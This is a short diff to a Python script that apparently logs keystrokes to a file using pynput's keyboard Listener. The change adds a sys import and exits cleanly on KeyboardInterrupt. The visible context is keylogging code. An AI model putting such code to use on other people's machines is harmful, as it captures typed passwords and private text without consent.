@@ -1,4 +1,4 @@
-import pynput 
+import pynput, sys 
 
 from pynput.keyboard import Key, Listener
 
@@ -21,4 +21,7 @@ def write_to_file(key):
             f.write(k)
 
 with Listener(on_press=press, on_release=release) as listener:
-    listener.join()
+    try:
+        listener.join()
+    except KeyboardInterrupt:
+        sys.exit(0)
